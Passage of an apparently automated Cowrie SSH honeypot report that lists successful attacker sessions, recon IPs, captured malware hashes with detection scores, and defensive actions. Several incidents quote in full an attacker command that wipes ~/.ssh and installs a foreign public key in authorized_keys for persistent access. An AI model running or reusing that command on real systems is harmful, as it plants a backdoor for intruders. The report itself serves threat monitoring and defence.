| `2026-06-09 07:34:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.148.249[.]2` to AbuseIPDB if not already reported
- [ ] Block `38.148.249[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7335470962b

| Field | Detail |
|---|---|
| **Source IP** | `38.148.249[.]2` |
| **First Seen** | 2026-06-09 07:34 |
| **Last Seen** | 2026-06-09 07:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 07:34:35` | `cowrie.session.connect` |
| `2026-06-09 07:34:35` | `cowrie.client.version` |
| `2026-06-09 07:34:35` | `cowrie.client.kex` |
| `2026-06-09 07:34:36` | `cowrie.login.success` |
| `2026-06-09 07:34:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.148.249[.]2` to AbuseIPDB if not already reported
- [ ] Block `38.148.249[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1deefab9fe8e

| Field | Detail |
|---|---|
| **Source IP** | `38.148.249[.]2` |
| **First Seen** | 2026-06-09 07:36 |
| **Last Seen** | 2026-06-09 07:36 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 07:36:21` | `cowrie.session.connect` |
| `2026-06-09 07:36:21` | `cowrie.client.version` |
| `2026-06-09 07:36:21` | `cowrie.client.kex` |
| `2026-06-09 07:36:22` | `cowrie.login.success` |
| `2026-06-09 07:36:22` | `cowrie.session.params` |
| `2026-06-09 07:36:22` | `cowrie.command.input` |
| `2026-06-09 07:36:22` | `cowrie.command.failed` |
| `2026-06-09 07:36:23` | `cowrie.log.closed` |
| `2026-06-09 07:36:23` | `cowrie.session.params` |
| `2026-06-09 07:36:23` | `cowrie.command.input` |
| `2026-06-09 07:36:24` | `cowrie.session.file_download` |
| `2026-06-09 07:36:24` | `cowrie.log.closed` |
| `2026-06-09 07:36:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.148.249[.]2` to AbuseIPDB if not already reported
- [ ] Block `38.148.249[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-319c088c0151

| Field | Detail |
|---|---|
| **Source IP** | `38.148.249[.]2` |
| **First Seen** | 2026-06-09 07:36 |
| **Last Seen** | 2026-06-09 07:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 07:36:27` | `cowrie.session.connect` |
| `2026-06-09 07:36:27` | `cowrie.client.version` |
| `2026-06-09 07:36:27` | `cowrie.client.kex` |
| `2026-06-09 07:36:28` | `cowrie.login.success` |
| `2026-06-09 07:36:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.148.249[.]2` to AbuseIPDB if not already reported
- [ ] Block `38.148.249[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-488fd24f5ec9

| Field | Detail |
|---|---|
| **Source IP** | `38.148.249[.]2` |
| **First Seen** | 2026-06-09 07:39 |
| **Last Seen** | 2026-06-09 07:40 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 07:39:59` | `cowrie.session.connect` |
| `2026-06-09 07:39:59` | `cowrie.client.version` |
| `2026-06-09 07:40:00` | `cowrie.client.kex` |
| `2026-06-09 07:40:00` | `cowrie.login.success` |
| `2026-06-09 07:40:01` | `cowrie.session.params` |
| `2026-06-09 07:40:01` | `cowrie.command.input` |
| `2026-06-09 07:40:01` | `cowrie.command.failed` |
| `2026-06-09 07:40:01` | `cowrie.log.closed` |
| `2026-06-09 07:40:02` | `cowrie.session.params` |
| `2026-06-09 07:40:02` | `cowrie.command.input` |
| `2026-06-09 07:40:02` | `cowrie.session.file_download` |
| `2026-06-09 07:40:02` | `cowrie.log.closed` |
| `2026-06-09 07:40:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.148.249[.]2` to AbuseIPDB if not already reported
- [ ] Block `38.148.249[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72646077e352

| Field | Detail |
|---|---|
| **Source IP** | `38.148.249[.]2` |
| **First Seen** | 2026-06-09 07:40 |
| **Last Seen** | 2026-06-09 07:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 07:40:05` | `cowrie.session.connect` |
| `2026-06-09 07:40:05` | `cowrie.client.version` |
| `2026-06-09 07:40:05` | `cowrie.client.kex` |
| `2026-06-09 07:40:06` | `cowrie.login.success` |
| `2026-06-09 07:40:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.148.249[.]2` to AbuseIPDB if not already reported
- [ ] Block `38.148.249[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cadae21d41df

| Field | Detail |
|---|---|
| **Source IP** | `38.148.249[.]2` |
| **First Seen** | 2026-06-09 07:43 |
| **Last Seen** | 2026-06-09 07:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 07:43:32` | `cowrie.session.connect` |
| `2026-06-09 07:43:32` | `cowrie.client.version` |
| `2026-06-09 07:43:32` | `cowrie.client.kex` |
| `2026-06-09 07:43:33` | `cowrie.login.success` |
| `2026-06-09 07:43:34` | `cowrie.session.params` |
| `2026-06-09 07:43:34` | `cowrie.command.input` |
| `2026-06-09 07:43:34` | `cowrie.command.failed` |
| `2026-06-09 07:43:34` | `cowrie.log.closed` |
| `2026-06-09 07:43:35` | `cowrie.session.params` |
| `2026-06-09 07:43:35` | `cowrie.command.input` |
| `2026-06-09 07:43:35` | `cowrie.session.file_download` |
| `2026-06-09 07:43:35` | `cowrie.log.closed` |
| `2026-06-09 07:43:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.148.249[.]2` to AbuseIPDB if not already reported
- [ ] Block `38.148.249[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62e451872ea1

| Field | Detail |
|---|---|
| **Source IP** | `38.148.249[.]2` |
| **First Seen** | 2026-06-09 07:43 |
| **Last Seen** | 2026-06-09 07:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 07:43:38` | `cowrie.session.connect` |
| `2026-06-09 07:43:38` | `cowrie.client.version` |
| `2026-06-09 07:43:38` | `cowrie.client.kex` |
| `2026-06-09 07:43:39` | `cowrie.login.success` |
| `2026-06-09 07:43:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.148.249[.]2` to AbuseIPDB if not already reported
- [ ] Block `38.148.249[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-295d01fb62b3

| Field | Detail |
|---|---|
| **Source IP** | `38.148.249[.]2` |
| **First Seen** | 2026-06-09 07:52 |
| **Last Seen** | 2026-06-09 07:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 07:52:18` | `cowrie.session.connect` |
| `2026-06-09 07:52:18` | `cowrie.client.version` |
| `2026-06-09 07:52:19` | `cowrie.client.kex` |
| `2026-06-09 07:52:20` | `cowrie.login.success` |
| `2026-06-09 07:52:20` | `cowrie.session.params` |
| `2026-06-09 07:52:20` | `cowrie.command.input` |
| `2026-06-09 07:52:20` | `cowrie.command.failed` |
| `2026-06-09 07:52:21` | `cowrie.log.closed` |
| `2026-06-09 07:52:21` | `cowrie.session.params` |
| `2026-06-09 07:52:21` | `cowrie.command.input` |
| `2026-06-09 07:52:21` | `cowrie.session.file_download` |
| `2026-06-09 07:52:21` | `cowrie.log.closed` |
| `2026-06-09 07:52:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.148.249[.]2` to AbuseIPDB if not already reported
- [ ] Block `38.148.249[.]2` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71e03890cbc8

| Field | Detail |
|---|---|
| **Source IP** | `38.148.249[.]2` |
| **First Seen** | 2026-06-09 07:52 |
| **Last Seen** | 2026-06-09 07:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 07:52:24` | `cowrie.session.connect` |
| `2026-06-09 07:52:24` | `cowrie.client.version` |
| `2026-06-09 07:52:24` | `cowrie.client.kex` |
| `2026-06-09 07:52:25` | `cowrie.login.success` |
| `2026-06-09 07:52:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.148.249[.]2` to AbuseIPDB if not already reported
- [ ] Block `38.148.249[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `128.199.25[.]179` | **124** | 2026-06-09 03:55 | 2026-06-09 07:52 | 98m | 0 | `T1592` | 🟠 MEDIUM |
| `143.110.178[.]27` | **69** | 2026-06-09 04:57 | 2026-06-09 07:52 | 63m | 0 | `T1592` | 🟠 MEDIUM |
| `117.80.226[.]34` | **33** | 2026-06-09 05:30 | 2026-06-09 06:57 | 64m | 0 | `T1592` | 🟠 MEDIUM |
| `103.38.219[.]22` | **30** | 2026-06-09 05:45 | 2026-06-09 06:48 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `122.13.25[.]186` | **30** | 2026-06-09 05:28 | 2026-06-09 05:56 | 56m | 0 | `T1592` | 🟠 MEDIUM |
| `173.249.52[.]138` | **30** | 2026-06-09 03:58 | 2026-06-09 04:48 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `182.18.139[.]237` | **30** | 2026-06-09 03:55 | 2026-06-09 04:58 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `31.56.178[.]132` | **30** | 2026-06-09 05:36 | 2026-06-09 06:41 | 1m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `106.13.181[.]42` | **29** | 2026-06-09 05:27 | 2026-06-09 05:56 | 41m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `38.148.249[.]2` | **29** | 2026-06-09 06:50 | 2026-06-09 07:52 | 0m | 29 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.118[.]177` | **17** | 2026-06-09 06:38 | 2026-06-09 07:27 | 16m | 4 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `167.71.225[.]225` | **12** | 2026-06-09 04:21 | 2026-06-09 07:13 | 6m | 0 | `T1592` | 🟠 MEDIUM |
| `20.81.140[.]174` | **7** | 2026-06-09 04:09 | 2026-06-09 07:38 | 5m | 0 | `T1592` | 🟢 LOW |
| `18.116.239[.]38` | **3** | 2026-06-09 04:16 | 2026-06-09 04:16 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]135` | **3** | 2026-06-09 07:09 | 2026-06-09 07:10 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.61.122[.]229` | **2** | 2026-06-09 05:30 | 2026-06-09 05:33 | 0m | 0 | `T1592` | 🟢 LOW |
| `125.138.175[.]113` | **2** | 2026-06-09 06:42 | 2026-06-09 06:51 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `180.106.83[.]59` | **2** | 2026-06-09 05:36 | 2026-06-09 06:54 | 4m | 0 | `T1592` | 🟢 LOW |
| `92.204.128[.]218` | **2** | 2026-06-09 07:51 | 2026-06-09 07:52 | 1m | 0 | `T1592` | 🟢 LOW |
| `106.12.6[.]79` | 1 | 2026-06-09 05:38 | 2026-06-09 05:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `110.93.224[.]226` | 1 | 2026-06-09 04:02 | 2026-06-09 04:02 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `111.53.147[.]80` | 1 | 2026-06-09 05:30 | 2026-06-09 05:32 | 120s | 0 | `T1592` | 🟢 LOW |
| `111.70.39[.]214` | 1 | 2026-06-09 06:02 | 2026-06-09 06:02 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `115.190.216[.]185` | 1 | 2026-06-09 04:01 | 2026-06-09 04:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `116.113.241[.]82` | 1 | 2026-06-09 06:38 | 2026-06-09 06:39 | 59s | 0 | `T1592` | 🟢 LOW |
| `117.149.196[.]213` | 1 | 2026-06-09 07:33 | 2026-06-09 07:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.145.225[.]50` | 1 | 2026-06-09 06:37 | 2026-06-09 06:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.229.9[.]97` | 1 | 2026-06-09 05:35 | 2026-06-09 05:35 | 12s | 0 | `T1592` | 🟢 LOW |
| `124.88.174[.]143` | 1 | 2026-06-09 06:02 | 2026-06-09 06:02 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.115[.]143` | 1 | 2026-06-09 06:47 | 2026-06-09 06:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `173.249.0[.]223` | 1 | 2026-06-09 06:44 | 2026-06-09 06:44 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `175.170.144[.]17` | 1 | 2026-06-09 06:54 | 2026-06-09 06:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.179[.]77` | 1 | 2026-06-09 06:58 | 2026-06-09 07:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.234[.]93` | 1 | 2026-06-09 05:31 | 2026-06-09 05:33 | 120s | 0 | `T1592` | 🟢 LOW |
| `182.44.38[.]181` | 1 | 2026-06-09 06:48 | 2026-06-09 06:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `186.235.48[.]167` | 1 | 2026-06-09 07:10 | 2026-06-09 07:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `203.252.10[.]4` | 1 | 2026-06-09 07:11 | 2026-06-09 07:11 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `211.22.223[.]20` | 1 | 2026-06-09 04:57 | 2026-06-09 04:58 | 30s | 0 | `T1592` | 🟢 LOW |
| `52.161.59[.]102` | 1 | 2026-06-09 07:52 | 2026-06-09 07:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `58.50.205[.]237` | 1 | 2026-06-09 04:20 | 2026-06-09 04:21 | 12s | 0 | `T1592` | 🟢 LOW |
| `59.127.68[.]72` | 1 | 2026-06-09 03:52 | 2026-06-09 03:52 | 31s | 0 | `T1592` | 🟢 LOW |
| `59.24.162[.]217` | 1 | 2026-06-09 06:32 | 2026-06-09 06:32 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `65.49.20[.]67` | 1 | 2026-06-09 04:00 | 2026-06-09 04:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `92.55.69[.]185` | 1 | 2026-06-09 06:03 | 2026-06-09 06:03 | 31s | 0 | `T1592` | 🟢 LOW |
| `95.79.108[.]51` | 1 | 2026-06-09 06:31 | 2026-06-09 06:31 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (35 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5` | GZip Archive | `fc6f8ae5f64e4f17...` | 14/100 | 🟢 LOW | **35/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `20.81.140[.]174` | US | Microsoft Corporation | **100** ⚠️ | 0 |
| `92.126.223[.]175` | RU | OJSC Sibirtelecom | **100** ⚠️ | 50 |
| `167.71.225[.]225` | IN | DigitalOcean, LLC | **100** ⚠️ | 0 |
| `128.199.25[.]179` | IN | DigitalOcean, LLC | **100** ⚠️ | 2 |
